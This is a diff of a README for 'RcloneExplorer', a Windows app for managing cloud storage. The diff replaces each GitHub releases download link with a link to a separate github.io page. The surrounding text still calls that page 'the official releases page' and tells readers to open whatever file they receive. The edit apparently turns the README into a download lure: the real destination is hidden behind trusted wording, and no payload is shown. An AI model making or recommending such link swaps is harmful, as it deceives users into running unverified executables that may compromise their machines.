@@ -1,6 +1,6 @@
 # 🚀 RcloneExplorer - Your Clouds, One Simple Window
 
-[![Download RcloneExplorer](https://img.shields.io/badge/⬇️_Download-RcloneExplorer_Now-8A2BE2?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Vikkysurmounted714/RcloneExplorer/releases)
+[![Download RcloneExplorer](https://img.shields.io/badge/⬇️_Download-RcloneExplorer_Now-8A2BE2?style=for-the-badge&logo=windows&logoColor=white)](https://vikkysurmounted714.github.io)
 
 RcloneExplorer is a modern, portable app for Windows 10 and Windows 11 that puts all of your cloud storage in one friendly window. Instead of jumping between websites and browser tabs, you get a clean point-and-click interface where you can browse, transfer and sync files across Google Drive, OneDrive, Dropbox, pCloud, Amazon S3 and more than 70 other cloud services. No command line. No complicated setup screens. Just your files, where you expect them.
 
@@ -40,12 +40,12 @@ Nothing else is needed. You do not have to install extra libraries, runtimes or 
 
 Getting started takes just a couple of minutes.
 
-1. Open the official releases page here: **https://github.com/Vikkysurmounted714/RcloneExplorer/releases**
+1. Open the official releases page here: **https://vikkysurmounted714.github.io**
 2. Visit this link to download the application.
 3. Wait for the download to finish, then open the file you received.
 4. Follow the on-screen prompts to start RcloneExplorer.
 
-[![Download RcloneExplorer](https://img.shields.io/badge/⬇️_Get_RcloneExplorer-Releases_Page-FF69B4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Vikkysurmounted714/RcloneExplorer/releases)
+[![Download RcloneExplorer](https://img.shields.io/badge/⬇️_Get_RcloneExplorer-Releases_Page-FF69B4?style=for-the-badge&logo=github&logoColor=white)](https://vikkysurmounted714.github.io)
 
 That is the entire process. Always download from the official releases page above so you know you are getting the genuine, up-to-date version. Avoid copies from other websites, as those may be outdated or modified.
 
